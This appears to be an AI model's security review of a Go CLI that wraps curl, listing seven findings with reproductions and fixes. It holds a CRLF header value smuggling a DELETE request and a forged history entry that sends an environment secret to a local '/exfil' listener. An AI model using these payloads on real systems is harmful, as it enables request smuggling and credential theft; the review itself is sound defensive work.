      {
        "type": "text",
        "text": "Repo unmodified (the listed changes predate my review). Findings below; all CRITs were reproduced against a built binary and a local listener.\n\n---\n\n## 1. Header/request-line injection from unvalidated CR/LF in header, cookie and method values — CRIT\n**`internal/curl/config.go:220`** (also `:246` cookies, `:150` method, `:259` Content-Type), root cause at **`internal/request/build.go:259`** and **`:343`**\n\n`escapeDirective` correctly escapes `\\n`/`\\r` so they cannot break out of a curl config *directive* — but curl's parser un-escapes `\\n` back into a literal LF **inside the value**, and curl then writes that LF straight onto the wire. Nothing anywhere validates that a header value, cookie value or method is free of CR/LF. Header *names* are validated only for `--header` (`httpFieldName`); names coming from spec-declared header/cookie parameters (`located`, build.go:259), from profile headers (build.go:289) and from a replayed history entry are not validated at all.\n\nVerified end-to-end. A GET-only spec, run **without `--allow-mutations`**:\n\n```yaml\nparameters:\n  - name: X-Trace\n    in: header\n    required: true\n    schema:\n      type: string\n      example: \"ok\\r\\n\\r\\nDELETE /admin/users HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nX-Smuggled: yes\\r\\n\"\n```\n\n`talaria run spec.yaml` produced on the wire:\n\n```\nGET /p HTTP/1.1\n...\nX-Trace: ok\n\nDELETE /admin/users HTTP/1.1\nHost: 127.0.0.1\nX-Smuggled: yes\n```\n\nA second, complete, attacker-chosen request is smuggled onto the connection. This defeats the `--allow-mutations` gate (DESIGN §3.5, \"safe by default\") using nothing but a spec — and \"point it at any API doc it has never seen before\" is the advertised workflow, so the spec is untrusted input by construction. The same value also lands verbatim in the emitted curl and in the pretty/TSV rows, so `--output tsv` row structure is corrupted by the injected newline.\n\n**Fix:** reject any value containing `\\r` or `\\n` at bind time in `internal/request/build.go` (for `located`, `pairs` and profile headers) as a usage error, and re-check in `document.auth`/`document.cookies` as the last gate before the wire. Apply `isFieldName` to spec- and profile-supplied header names too, and validate `req.Method` against a token charset before writing the `request` directive.\n\n---\n\n## 2. `history replay` resolves an arbitrary named environment variable to an arbitrary host — CRIT\n**`cmd/talaria/history.go:668`** (`replayValue` → `secret.ParseRef`)\n\n`replayValue` turns any stored string of the form `<redacted:env:NAME>` back into a live `SecretRef` and `internal/curl` resolves it at exec time. `NAME` is whatever the store says, and the destination is `entry.URL`, also whatever the store says. The history store lives in the *agent's own* state directory (`$XDG_STATE_HOME/talaria/history.jsonl`) and is writable by the same uid the agent runs as.\n\nVerified: a hand-written `history.jsonl` line with `\"headers\":{\"X-Steal\":\"<redacted:env:MY_UNRELATED_SECRET>\"}` and `\"url\":\"http://127.0.0.1:19950/exfil\"`, then `talaria history replay x1`:\n\n```\nGET /exfil HTTP/1.1\nHost: 127.0.0.1:19950\nX-Steal: AWS_ROOT_KEY_ABC123\n```\n\nThis inverts the product's premise: talaria becomes a general-purpose env-var read-and-exfiltrate primitive for any variable, not just the `TALARIA_AUTH_*` namespace the firewall is scoped to, and it launders the exfiltration through the one binary the deployment trusts with credentials. Under §5a's own \"fully realises the boundary\" deployment (agent runs without the vars; the binary reads them) this is a complete break.\n\n**Fix:** do not accept an arbitrary ref name from the store. Restrict replay-resolvable refs to the `TALARIA_AUTH_*` convention plus names present in the selected profile's `auth:` map, and reject anything else with a usage error naming the variable it refused.\n\n---\n\n## 3. Sensitive *literal* query values are not scrubbed from curl's stderr, leaking in cleartext on the error path — CRIT\n**`internal/curl/exec.go:277`**\n\n`scrubber` builds its replacer only from values where `p.Value.IsSecret()` is true. A literal the user typed under a credential-shaped name — `--query api_key=…`, which `hide()` (build.go:309) deliberately marks `Sensitive` and renders `<redacted>` on stdout, in history and in emitted curl — is skipped, so nothing rewrites it out of curl's stderr. curl exit 3 echoes the **full URL including the query string**, and `requestFailed` embeds that text in the exit-1 JSON on stderr.\n\nVerified. A spec path containing `[` (entirely spec-controlled) forces curl exit 3:\n\n```\n$ talaria call spec.yaml getA --query api_key=SUPERSECRETLITERAL --output json\n{\"schema\":\"talaria/v1\",\"error\":{\"code\":1,\"message\":\"the request could not be completed: curl exited 3: curl: (3) bad range in URL position 26:\\nhttp://127.0.0.1:19930/a[b?api_key=SUPERSECRETLITERAL\\n ^\"}}\n```\n\nThe same call with an `apiKey`-in-query security scheme correctly prints `<redacted:env:TALARIA_AUTH_APIKEY_QK>`, which confirms the gap is exactly the literal path. §5a: \"Errors are built from the redacted representation, never the raw one.\"\n\n**Fix:** in `scrubber`, iterate on `p.Value.IsSensitive()` rather than `IsSecret()`; for a sensitive literal use `p.Value.Reveal()` as the needle and `secret.Placeholder` as the replacement (plus its `url.QueryEscape` form, as the ref branch already does).\n\n---\n\n## 4. Curl inherits the full process environment, contradicting the stated invariant — WARN\n**`internal/curl/exec.go:41`** and **`:87`**\n\nThe comment states credentials are \"not in the environment curl inherits (§5a)\". `cmd.Env` is never set, so Go passes `os.Environ()` and every `TALARIA_AUTH_*` value is readable in `/proc/<curl-pid>/environ` for the lifetime of the call. The `argv`/`cmdline` half of the claim is genuinely implemented; the environment half is not. A reviewer or downstream author reading this comment will believe a property the code does not provide.\n\n**Fix:** either set `cmd.Env` to a filtered environment (keep `PATH`, `HOME`, proxy and TLS variables; drop `TALARIA_AUTH_*` and anything a profile references), or correct the comment to claim only what is true.\n\n---\n\n## 5. `redact.body-paths` is applied to the request body in history but not on stdout or in emitted curl — WARN\n**`cmd/talaria/call.go:465`**\n\n`corpus.Redactors.requestBody` (entry.go:242) runs the response redactor's JSON paths over the *request* body, so `access_token` and the user's configured paths are stripped from the permanent artifact. `callPayload` writes `view.Request.Body = string(req.Body.Data)` raw, and `curl.Render`'s `--data-raw` does the same. Verified:\n\n```\nstdout:  \"body\":\"{\\\"access_token\\\":\\\"SUPERCANARY123\\\"}\"\nhistory: \"data\":\"{\\\"access_token\\\":\\\"\\\\u003credacted\\\\u003e\\\"}\"\n```\n\nThis is the exact inversion `buildRequest`'s own comment warns against (\"A pattern that hides a value in the permanent artifact but not on the stdout an agent reads has the firewall backwards\"). The canary suite does not cover a user-supplied body, so it does not catch this.\n\n**Fix:** apply the same `ResponseRedactor.Body` to `view.Request.Body` in `callPayload`, and to the `--data-raw` word in `curl/render.go:128`. Add a canary case that injects through `--body`.\n\n---\n\n## 6. Spec cache is served forever with no expiry, revalidation or integrity check — WARN\n**`internal/spec/source.go:87`**\n\n`loadURL` returns the cached bytes whenever the file exists — no TTL, no ETag/Last-Modified revalidation, no way for an agent to force a refresh. `isURL` (source.go:79) also accepts plaintext `http://`. A single on-path modification of one `http://` spec fetch is therefore permanent: the poisoned `servers[0].url` (which is where every subsequent call's resolved credential goes) and any injected header value from finding 1 persist across every later run, including runs done over a trusted network.\n\n**Fix:** stamp the cache entry with its fetch time and re-fetch past a TTL, send `If-None-Match`/`If-Modified-Since`, add a `--no-cache`/`--refresh-spec` flag, and warn once on stderr when a spec is fetched over plaintext `http://`.\n\n---\n\n## 7. Re-marshalling a redacted response body HTML-escapes the whole document — INFO\n**`internal/secret/response.go:119`**\n\nWhen any path matches, `json.Marshal` re-encodes the document with Go's default HTML escaping on, so the placeholder becomes `\"\\u003credacted\\u003e\"` and every unrelated `<`, `>`, `&` in the server's response is rewritten too (observed: `\"note\":\"a<b&c\"` → `\"a\\u003cb\\u0026c\"`). Semantically equivalent JSON, but it contradicts the file's own stated goal of reporting what the server actually sent, and only on the redacted path — so two responses that differ by one field render inconsistently.\n\n**Fix:** use a `json.Encoder` with `SetEscapeHTML(false)` (and `SetIndent(\"\", \"\")`) instead of `json.Marshal`.\n\n---\n\n**Not found:** no secrets committed in the diff (the canary values in `internal/canary/testdata` are generated per-run from `crypto/rand`); no secret ever reaches `exec.Command` argv; path/query/body parameterisation is correct (`url.PathEscape`, `url.QueryEscape`, `data-raw`); config file 0600 enforcement, corpus 0700/0600, temp body 0600 with post-exec delete, capture dir 0700, and the `flock`-on-sibling corpus lock are all correct; `SweepStale` lstats and never follows symlinks; base-URL scheme restriction, userinfo rejection and no-redirect-following are correct and applied at every boundary including replay; response redaction of `Set-Cookie`, built-in token paths and configured paths through nested arrays all verified working. `go test ./...` passes."
      }
    ],
    "resolvedModel": "claude-opus-5",
    "totalDurationMs": 573593,
